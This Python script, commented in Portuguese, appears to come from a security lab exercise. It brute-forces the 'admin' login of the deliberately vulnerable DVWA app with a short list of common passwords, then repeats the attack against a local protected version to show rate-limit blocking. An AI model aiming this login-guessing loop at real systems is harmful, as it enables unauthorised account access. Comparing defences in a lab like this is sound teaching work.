"""Compara força bruta no DVWA vulnerável e no ambiente protegido local."""
import time

import requests

from common import (dvwa_cookies, dvwa_url, local_url, new_result, print_and_save,
                    profile_args, protected_base_url, selected_profiles)

# A senha de laboratório aparece após seis valores inválidos para evidenciar o bloqueio.
PASSWORDS = ["123456", "admin", "root", "password123", "qwerty", "letmein", "password"]


def run_vulnerable() -> dict:
    url, cookies = dvwa_url("DVWA_BRUTE_URL", "/vulnerabilities/brute/"), dvwa_cookies()
    started, attempts, last_status = time.perf_counter(), 0, None
    for password in PASSWORDS:
        attempts += 1
        response = requests.get(url, params={"username": "admin", "password": password, "Login": "Login"}, cookies=cookies, timeout=10)
        last_status = response.status_code
        if "Welcome to the password protected area" in response.text:
            return new_result(profile="vulneravel", attack="forca_bruta", success=True, attempts=attempts, elapsed=time.perf_counter() - started, status_code=last_status, outcome="credencial_aceita_sem_rate_limit")
    return new_result(profile="vulneravel", attack="forca_bruta", success=False, attempts=attempts, elapsed=time.perf_counter() - started, status_code=last_status, outcome="credencial_nao_encontrada")


def run_protected() -> dict:
    url = local_url(f"{protected_base_url()}/login.php")
    started, attempts, last_status = time.perf_counter(), 0, None
    for password in PASSWORDS:
        attempts += 1
        response = requests.post(url, data={"username": "admin", "password": password}, timeout=10)
        last_status = response.status_code
        if response.status_code == 429:
            return new_result(profile="protegido", attack="forca_bruta", success=False, attempts=attempts, elapsed=time.perf_counter() - started, status_code=last_status, outcome="bloqueado_por_rate_limit")
        if "Autenticação realizada." in response.text:
            return new_result(profile="protegido", attack="forca_bruta", success=True, attempts=attempts, elapsed=time.perf_counter() - started, status_code=last_status, outcome="credencial_aceita")
    return new_result(profile="protegido", attack="forca_bruta", success=False, attempts=attempts, elapsed=time.perf_counter() - started, status_code=last_status, outcome="sem_acesso")


def main() -> None:
    args = profile_args(__doc__ or "Teste de força bruta")
    for profile in selected_profiles(args.perfil):
        try:
            result = run_vulnerable() if profile == "vulneravel" else run_protected()
        except (requests.RequestException, ValueError) as error:
            result = new_result(profile=profile, attack="forca_bruta", success=False, attempts=0, elapsed=0, status_code=None, outcome="erro_de_execucao", erro=str(error))
        print_and_save(result)


if __name__ == "__main__":
    main()
